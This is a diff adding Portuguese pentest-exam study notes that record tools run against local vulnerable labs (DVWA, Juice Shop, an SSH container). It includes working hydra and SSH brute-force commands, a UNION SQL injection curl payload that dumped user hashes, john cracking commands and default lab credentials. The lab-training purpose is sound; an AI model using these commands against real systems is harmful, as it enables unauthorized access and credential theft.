@@ -428,3 +428,108 @@ ncat ❌ → `nc` OpenBSD · `whois`/`dnsrecon` ❌ → `dig` + `nmap --script d
 searchsploit, impacket SMB validado). Os únicos limites são de snap (`/tmp`, `/usr/share`) e do hydra
 (sem SSH) — todos com caminho alternativo testado nesta mesma noite.
 
+---
+
+# ATUALIZAÇÃO 21/OUT — RE-VERIFICAÇÃO COM EXECUÇÃO REAL
+
+Todas as 8 ferramentas do núcleo foram executadas de novo hoje (não só `--version`), com alvos reais
+do lab. O que segue é o que Lorran pode contar como **certo**, porque rodou.
+
+## Tabela de hoje
+
+| Ferramenta | Versão real | Execução real feita hoje | Resultado |
+|---|---|---|---|
+| **nmap** | 7.992 | `db_nmap -p 3000,8080 127.0.0.1` (dentro do msf) | ✅ 2 portas abertas, gravou em `hosts`/`services` |
+| **msfconsole** | 6.4.126-dev | `msfdb status` + `db_nmap` + `info` de 4 módulos + `-x` | ✅ **Database started**; ms17_010/eternalblue, smb_ms17_010, smb_login, ssh_login, portscan/tcp todos resolvem |
+| **hydra** | 9.8dev | `http-get` contra DVWA:8080 | ⚠️ roda, mas **deu falso positivo** (ver abaixo). SSH continua ❌ |
+| **gobuster** | 3.8.2 | `dir` em DVWA com raft-small-words | ✅ achou login.php, setup.php, phpinfo.php, config/, docs/, external/, robots.txt |
+| **sqlmap** | 1.8.12#pip | DVWA `/vulnerabilities/sqli/?id=1` com sessão | ✅ **4 tipos**: boolean, error, time, UNION. DBMS MariaDB. `--dbs` → dvwa |
+| **netcat** | OpenBSD 1.226 | listener 4444 + conexão real | ✅ payload `LIBERTUS_NC_OK` recebido |
+| **john** | 1.9.0-jumbo | `--format=raw-md5` em 2 hashes DVWA | ✅ `admin:password` quebrado |
+| **ssh_brute.py** | paramiko 5.1.0 | contra 127.0.0.1:2222 (lab) | ✅ `msfadmin:msfadmin` em 0,1 s |
+
+## O que mudou de fato hoje
+
+### 1. msfdb CONFIRMADO funcionando (era a maior dúvida)
+`msfdb status` → **Database started**. `db_nmap` populou `hosts` e `services` na mesma sessão.
+Isso libera o fluxo profissional do exame: escanear → `services` → `hosts` → escolher exploit.
+- `db_nmap` usa o **nmap embutido do snap (7.95)**, não o 7.992 do sistema. Irrelevante na prática,
+  mas explica se a saída parecer diferente.
+
+### 2. Regra nova do `-r` (resource script) no msf snap
+| Onde está o .rc | Resultado |
+|---|---|
+| `/tmp/x.rc` | ❌ `[-] Cannot find resource script` (snap tem /tmp privado) |
+| `/home/libertus/.msftest.rc` (arquivo oculto) | ❌ `Permission denied @ rb_sysopen (Errno::EACCES)` |
+| `/home/libertus/msf.rc` (não-oculto no home) | ✅ funciona |
+
+**Regra:** script `.rc` vai em `~/nome.rc` (sem ponto na frente). Para 1-2 comandos, usar
+`msfconsole -q -x "comando1; comando2; exit"` — não depende de arquivo nenhum.
+
+### 3. hydra MENTE em http-get/http-head — armadilha séria
+Teste: `hydra -l admin -P lista 127.0.0.1 -s 8080 http-get /login.php`
+Resultado: `[8080][http-get] login: admin password: admin` — **falso positivo**.
+A senha real do DVWA é `password`, e `/login.php` responde **200 para qualquer requisição**
+(não existe 401 para o hydra detectar como falha).
+
+**Regra de ouro:** com `http-get`/`http-head`/`http-post-form`, **sempre** definir a condição de
+falha. Sem `F=` o hydra só verifica se a página abre — e ela sempre abre.
+```bash
+# http-post-form com string de falha explícita (DVWA /login.php):
+hydra -l admin -P pass.txt 127.0.0.1 -s 8080 http-post-form \
+  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+```
+Se o formulário tiver CSRF token, hydra **não serve** — o token muda a cada request. Aí é
+Burp Intruder (no Kali da INE) ou Python com `requests.Session` (modelo: `~/LIBERTUS/ejpt/web_login.py`).
+
+### 4. DVWA estava "quebrado" e o motivo era o CSRF
+Sintoma: login sempre voltava para `login.php`, `setup.php` dizia erro de credenciais do MySQL,
+mesmo com MySQL de pé e o usuário `app` conectando.
+Causa real: o formulário manda `<input type='hidden' name='user_token' value='...'>` — **aspas
+simples**. Um regex que só aceitava aspas duplas não pegava o token, o `checkToken()` do DVWA
+rejeitava o login e redirecionava.
+Correção validada (funciona agora):
+```bash
+python3 ~/LIBERTUS/ejpt/web_login.py -u http://localhost:8080/login.php -l admin -p password --extra "Login=Login"
+```
+Se o banco estiver vazio algum dia: `docker exec libertus-dvwa mysql -uroot -e "select user,password from dvwa.users;"`.
+Usuários do DVWA 1.10: `admin/password`, `gordonb/abc123`, `1337/charley`, `pablo/letmein`, `smithy/password`.
+
+### 5. SQLi do Juice Shop: manual FUNCIONA, sqlmap não acha
+Payload verificada hoje (retornou a tabela Users inteira, com hash):
+```bash
+curl -s -G "http://localhost:3000/rest/products/search" \
+  --data-urlencode "q=test')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
+```
+Retorno real: `admin@juice-sh.op` com `0192023a7bbd73250516f069df18b500` (= MD5 de `admin123`).
+sqlmap diz "not injectable" mesmo com `--level=3 --technique=U --prefix="'))" --suffix="--"`,
+porque o teste heurístico dele não fecha o parêntese antes de decidir.
+**Lição pro exame:** quando sqlmap disser "não injetável" e você tiver suspeita (erro de SQL na
+tela, aspas simples quebrando a página), teste UNION na mão antes de descartar o alvo.
+
+### 6. john: comando exato que funciona
+```bash
+john --format=raw-md5 --wordlist=~/wordlists/pass/top10k.txt hashes.txt
+john --format=raw-md5 --show hashes.txt
+```
+Cuidado com o formato: NTLM é `--format=nt`, sha512crypt é `--format=sha512crypt`, bcrypt é
+`--format=bcrypt`. Formato errado = john "roda" e não acha nada, sem erro claro.
+
+### 7. SSH: a rota que funciona nesta máquina (confirmado de novo)
+```bash
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -p 22 -l users.txt -P pass.txt -T 8
+```
+`python3` do sistema **não tem paramiko** (só o venv `~/venvs/pentest` tem, versão 5.1.0).
+Sempre chamar com o python do venv, senão dá `ModuleNotFoundError`.
+
+## Estado do lab agora (21/out 12:30)
+`DVWA` 8080 ✅ (banco ok, SQLi respondendo) · `Juice Shop` 3000 ✅ · `libertus-ssh` 2222 ✅
+(`msfadmin:msfadmin`) · `msfdb` ✅ iniciado. `docker restart` e `apt install` exigem senha de sudo —
+em cron não passam; rodar com Lorran presente quando precisar.
+
+## Veredito 21/out
+Núcleo **100% verificado em execução**. Nenhuma ferramenta do exame está fora. As duas armadilhas que
+podem custar ponto — hydra com falso positivo e sqlmap desistindo cedo demais — estão documentadas
+acima com o contra-ataque testado.
+
+
